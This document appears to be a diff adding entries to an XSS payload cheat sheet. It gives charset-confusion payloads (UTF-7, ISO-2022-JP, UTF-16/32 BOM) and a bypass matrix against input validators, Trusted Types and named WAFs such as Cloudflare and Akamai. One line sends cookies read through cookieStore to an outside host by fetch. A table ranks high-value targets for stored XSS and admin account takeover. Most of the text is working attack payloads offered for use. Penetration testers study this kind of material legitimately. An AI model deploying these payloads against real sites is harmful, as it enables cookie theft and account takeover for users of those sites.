+<!-- UTF-7: inject into meta refresh or link tag that lacks charset -->
+<!-- Browser decodes +ADw- as < and +AD4- as > in UTF-7 mode -->
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
++ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(document.cookie)+ACI- /+AD4-
+
+<!-- Trigger UTF-7 by injecting Content-Type via CRLF injection -->
+<!-- or exploiting a response that returns Content-Type without charset -->
+<!-- In attack: encode entire payload in UTF-7 before sending to server -->
+
+<!-- ISO-2022-JP — inject %1b(J escape before a backslash-escaped context -->
+<!-- Server is in an Asian locale / accepts non-UTF8 charsets -->
+search=%1b(J&lang=en";alert(1)//
+<!-- The %1b(J sequence shifts charset; next \" becomes ¥" which doesn't escape the string -->
+
+<!-- UTF-16 BOM override — prepend %FE%FF to force UTF-16BE decoding -->
+%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E
+<!-- Decoded as UTF-16BE: <svg/onload=alert()> -->
+
+<!-- UTF-32 BOM variant -->
+%00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g...
+
+<!-- Test for charset confusion: does the response have a charset declaration? -->
+<!-- curl -I https://target.com/search?q=test | grep -i content-type          -->
+<!-- If Content-Type: text/html (no charset=) → try UTF-7 and BOM attacks     -->
+```
+
+**Prerequisites:**
+- UTF-7: Response must lack `charset` in Content-Type or `<meta charset>` — rare in 2026 but found in legacy apps and some API responses rendered as HTML
+- ISO-2022-JP: Server must accept non-UTF-8 charsets AND reflect them; most common in Japanese-locale applications
+- BOM: Requires ability to inject raw bytes into response beginning (file upload preview, SSRF-based response, CRLF injection into response headers)
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Bypass Matrix (Updated 2026-05-29)
+
+### New Entries — Techniques Added 2026-05-29
+
+| Filter / Defense | Bypass Technique | Payload Example |
+|-----------------|------------------|-----------------|
+| Email validator (RFC0822) | Quoted local-part injection | `"><svg/onload=confirm(1)>"@x.y` |
+| Email validator (RFC5322) | Comment field injection | `xss@example.com(<img src=x onerror=alert(1)>)` |
+| Phone number validator | RFC3966 phone-context injection | `+1234;phone-context=<script>alert(0)</script>` |
+| `document.cookie` keyword blocked | `window.cookieStore.getAll()` async API | `cookieStore.getAll().then(c=>fetch('//x.com/?d='+btoa(JSON.stringify(c))))` |
+| Tag name blocklist (lowercase match) | Unicode long-s/dotless-i typecase | `<ſvg onload=alert(1)>`, `<ıframe src=javascript:alert(1)>` |
+| Backtick `` ` `` character blocked | `&DiacriticalGrave;` HTML entity in script | `<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>` |
+| Semicolon `;` blocked | Arithmetic / ternary operator chaining | `'x' * alert(document.cookie) * 'y'` |
+| Keywords in event handler value blocked | `eval(id)` — payload in SVG id attribute | `<svg id="alert(1)" onload="eval(id)">` |
+| Common event handler blocklist | Obscure handlers (pointer, clipboard, animation) | `<div onpointerover=alert(1)>`, `<div onanimationstart=alert(1) style="animation:x">` |
+| `require-trusted-types-for 'script'` | Create permissive own TT policy (unrestricted names) | `trustedTypes.createPolicy('x',{createHTML:s=>s})` → `innerHTML` |
+| `require-trusted-types-for 'script'` | Non-protected sink (`location.href`) | `location.href='javascript:alert(1)'` — TT does not cover navigation |
+| Open shadow root DOM | Inject via `shadowRoot.innerHTML` | `el.shadowRoot.innerHTML='<img src=x onerror=alert(document.cookie)>'` |
+| `<style>` allowed, `<script>` blocked | IE CSS `expression()` | `<div style="width:expression(alert(document.cookie))">` |
+| `<style>` allowed (legacy Firefox) | `-moz-binding` XBL remote script | `div{-moz-binding:url(data:text/xml;base64,...#xss)}` |
+| Dot notation blocked (`document.cookie`) | Bracket notation + string concat | `window['doc'+'ument']['cook'+'ie']` |
+| WAF keyword match without charset decode | UTF-7 charset confusion | `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` |
+| Cloudflare WAF | Unknown attribute before event handler | `<svg/onrandom=x onload=confirm(1)>` |
+| Akamai WAF | Newline-encoded `details` attributes | `<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>` |
+| Incapsula WAF | CRLF in SVG onload | `<svg onload\r\n=$.globalEval("al"+"ert()")>` |
+| WordFence WAF | HTML entity for one char in `javascript:` | `<a href=javas&#99;ript:alert(1)>` |
+
+### High-Value Targets (New — 2026-05-29)
+
+| Target | Why High Value | Impact |
+|--------|---------------|--------|
+| Email input fields (registration, profile) | RFC0822/5322 validators accept XSS chars | Stored XSS → admin panel ATO |
+| Phone number fields | RFC3966 phone-context parameter not sanitized | Stored XSS in user record |
+| Web Components (`<custom-element>`) | Shadow DOM often unsanitized; `shadowRoot.innerHTML` sink | Persistent XSS affecting all viewers |
+| Corporate intranets / OT systems (IE11) | CSS `expression()` executes in IE without script tag | Cookie theft with zero HTML event handler |
+| Legacy Firefox (<56) environments | `-moz-binding` XBL in style attribute | CSS-only XSS bypass |
+| Apps with `require-trusted-types-for 'script'` | Non-navigation-sink gap in TT coverage | Bypass via `location.href` or unrestricted policy creation |
